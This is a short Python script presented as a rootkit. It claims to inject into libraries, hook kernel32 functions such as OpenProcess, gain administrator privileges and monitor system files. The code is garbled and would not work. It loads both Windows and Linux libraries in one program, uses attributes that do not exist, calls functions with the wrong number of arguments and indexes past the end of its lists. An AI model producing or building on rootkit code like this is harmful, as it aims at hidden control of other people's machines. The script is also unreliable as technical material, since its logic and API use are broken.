import os
import sys
import ctypes

# Required Libraries
ctypes.cdll.LoadLibrary('ntdll.dll')
ctypes.cdll.LoadLibrary('libc.so.6')

class Rootkit():
    def __init__(self):
        self.hooked = {}

    def inject(self, library_name):
        # Load Library
        lib = ctypes.cdll.LoadLibrary(library_name)

        # Find Address of Functions in Library
        kernel32_address_of_functions = (lib.addressoffunction["kernel32.dll"], "kernel32.dll")

        # Create a New Process with Administrator Privileges
        token_privileges = 0x00200000 | 0x00400000

        # Monitor System Files
        self.pids = []
        for file in os.listdir('/System'):
            if file.endswith(".dll"):
                self.add_pid(ctypes.windll.kernel32.OpenProcess, ["kernel32.dll", "OpenProcess"], (file, 'r'))

    def add_pid(self, function_address, args):
        # Address of Functions
        address_of_functions = {"kernel32.dll": function_address[0], "libc.so.6": function_address[1]}

        self.hooked[args[2]] = (function_address, args)

    def restore_process(self, process_name):
        # Get Process ID from System
        for proc in os.listdir('/System'):
            if proc.endswith(".dll"):
                # Restore Process
                pid = self.add_pid(ctypes.windll.kernel32.OpenProcess, ["kernel32.dll", "OpenProcess"], (proc, 'r'))
                return True

        return False


if __name__ == "__main__":
    rootkit = Rootkit()
    rootkit.inject("libc.so.6")
